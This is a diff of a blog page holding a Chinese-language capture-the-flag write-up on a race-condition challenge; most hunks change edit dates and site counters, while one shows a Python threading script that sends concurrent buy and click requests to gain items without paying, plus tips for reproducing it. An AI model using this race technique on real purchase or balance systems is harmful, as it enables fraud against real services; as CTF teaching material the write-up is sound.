@@ -30,7 +30,7 @@
 <meta property="og:description" content="Challenge 购买 10 个 item。初始余额不够，click 每次 +1 cent，最多 50 次。题名 Quangcurrency 暗示 concurrency（race condition）。 Solution 核心是竞态条件（TOCTOU &#x2F; lost update）。buy.php 和 click.php 两个端点的余额读写操作不加锁，并发请求可以制造覆盖： 12buy.php:">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-06-20T06:44:57.000Z">
-<meta property="article:modified_time" content="2026-09-08T14:40:47.447Z">
+<meta property="article:modified_time" content="2026-09-15T01:54:43.819Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="race-condition">
@@ -235,18 +235,18 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">409</span>
+          <span class="site-state-item-count">532</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">265</span>
+        <span class="site-state-item-count">348</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -319,7 +319,7 @@ p.spoiler {
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-15 09:54:43" itemprop="dateModified" datetime="2026-09-15T09:54:43+08:00">2026-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -385,7 +385,7 @@ update）。<code>buy.php</code> 和 <code>click.php</code>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, threading</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.cookies.<span class="built_in">set</span>(<span class="string">&#x27;WC&#x27;</span>, <span class="string">&#x27;your_cookie&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">race_round</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;并发发送 buy 和 click&quot;&quot;&quot;</span></span><br><span class="line">    t1 = threading.Thread(target=<span class="keyword">lambda</span>: s.get(<span class="string">&#x27;buy.php&#x27;</span>))</span><br><span class="line">    t2 = threading.Thread(target=<span class="keyword">lambda</span>: s.get(<span class="string">&#x27;click.php&#x27;</span>))</span><br><span class="line">    t1.start(); t2.start()</span><br><span class="line">    t1.join(); t2.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):  <span class="comment"># 不需要太多轮</span></span><br><span class="line">    race_round(s)</span><br><span class="line">    stats = s.get(<span class="string">&#x27;stats.php&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> stats.json().get(<span class="string">&#x27;items&#x27;</span>) &gt;= <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>click 只有 50 次，不要浪费在大循环上</li>
-<li>并发强度不需要太高——官方论坛提示甚至可以用浏览器多标签手动复现</li>
+<li>并发强度不需要太高，官方论坛提示甚至可以用浏览器多标签手动复现</li>
 <li>不要 reset，除非状态已不可恢复</li>
 <li>可以在浏览器中手动验证：同时按 buy 和 click 按钮，观察 item
 增加但余额未对应减少</li>
